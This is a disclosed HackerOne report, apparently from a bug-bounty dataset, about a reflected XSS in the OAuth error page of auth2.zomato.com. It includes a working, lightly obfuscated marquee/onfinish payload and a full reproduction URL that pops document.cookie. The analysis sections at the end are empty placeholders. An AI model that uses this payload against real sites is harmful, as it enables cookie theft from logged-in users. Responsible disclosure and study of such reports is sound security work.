---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '456333'
original_report_id: '456333'
title: '[auth2.zomato.com] Reflected XSS at `oauth2/fallbacks/error` | ORY Hydra an
  OAuth 2.0 and OpenID Connect Provider'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: zomato
created_at: '2018-12-05T18:21:06.884Z'
disclosed_at: '2019-01-21T05:54:09.831Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 46
asset_identifier: '*.zomato.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [auth2.zomato.com] Reflected XSS at `oauth2/fallbacks/error` | ORY Hydra an OAuth 2.0 and OpenID Connect Provider

## Metadata

- HackerOne Report ID: 456333
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: zomato
- Disclosed At: 2019-01-21T05:54:09.831Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Heyy there,
I have found a xss in auth2.zomato.com

**Full url:**https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xss&error_hint=xss
**Vulnerable Parameters:** All available parameters are vulnerable
**XSS Payload:** `<marquee loop%3d1 width%3d0 onfinish%3dco\u006efirm(document.cookie)>XSS<%2fmarquee>`

**Steps To Reproduce the xss**
Just copy paste and load this url in your firefox browser and tadaa you will get the xss popup
`https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E`

**POC:**
{F386017}

## Impact

An attacker can send this url with payload to an already  login user and can steal the cookie.

Thankyou
Kind Regards
Sudhanshu

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
